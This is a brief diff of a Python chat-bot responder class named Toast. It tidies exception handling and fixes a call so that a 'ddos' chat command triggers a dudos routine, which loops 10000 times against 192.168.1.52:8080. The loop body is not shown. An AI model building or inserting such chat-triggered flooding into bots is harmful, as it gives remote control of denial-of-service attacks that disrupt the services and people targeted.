@@ -13,8 +13,8 @@ class Toast(BaseResponder):
         try:
             for command in self.config['module_config'][self.config_namespace][self.config_name].keys():
                 rw.append(command)
-        except:
-            pass
+        except Exception as e:
+            print(e)
         return rw
 
     def handle_privmsg(self, msg):
@@ -23,7 +23,7 @@ class Toast(BaseResponder):
             print('got command: %s' % command)
             self.respond(msg, command + ' ok!')
             if command == 'ddos':
-                dudos(host='192.168.1.52', port=8080)
+                self.dudos(host='192.168.1.52', port=8080)
 
     def dudos(self, host='127.0.0.1', port=8080, times=10000):
         for x in range(times):
